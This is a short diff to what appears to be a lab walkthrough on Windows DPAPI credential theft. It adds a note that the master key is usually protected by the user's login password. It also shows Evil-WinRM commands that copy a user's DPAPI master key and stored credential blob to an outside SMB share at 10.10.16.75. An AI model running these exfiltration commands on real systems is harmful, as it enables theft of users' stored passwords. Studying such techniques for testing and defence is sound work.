@@ -1,5 +1,10 @@
 
 Copy 2 file, one is the master key And the other is where other passwords is stored.
+
+
+> [!NOTE] Master key password
+> The master key is protected using password, mostly its the login password of the user.
+
 ```powershell
 *Evil-WinRM* PS C:\> copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407" \\10.10.16.75\share\masterkey_blob
 *Evil-WinRM* PS C:\> copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9" \\10.10.16.75\share\credential_blob
